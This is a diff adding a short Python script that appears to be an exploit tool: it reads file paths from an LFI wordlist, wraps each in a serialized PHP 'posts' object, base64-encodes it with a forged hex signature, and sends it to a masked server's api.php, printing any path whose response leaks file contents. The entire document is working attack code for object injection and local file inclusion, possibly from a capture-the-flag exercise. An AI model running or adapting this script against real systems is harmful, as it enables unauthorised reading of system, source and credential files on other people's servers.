@@ -1,0 +1,26 @@
+from binascii import hexlify
+import urllib3
+import base64
+
+
+with open('LFI-gracefulsecurity-linux.txt') as file:
+    while line := file.readline().rstrip():  # print(num := 15) the walrus operator
+        #print(line)
+        to_check = line
+        message = f'O:5:"posts":1:{{s:8:"FileName";s:{len(to_check)}:"{to_check}";}}'
+        message_bytes = message.encode('ascii')
+        base64_bytes = base64.b64encode(message_bytes)
+        base64_message = base64_bytes.decode('ascii')
+
+        post = base64_message
+        sig = hexlify(base64_message.encode())
+        http = urllib3.PoolManager()
+        url = f'http://*************/api.php?post={post}&sig={sig.decode()}'
+
+        response = http.request('GET', url)
+        if len(response.data.decode('utf-8')) > 4 and len(response.data.decode('utf-8')) !=12: # 4 = empty 12 = sig error
+            #print(response.status)
+            print(line) # LFI Path
+            print(response.data.decode('utf-8')) # source code to show
+            print(len(response.data.decode('utf-8'))) # response len
+            print(url) # encoded url
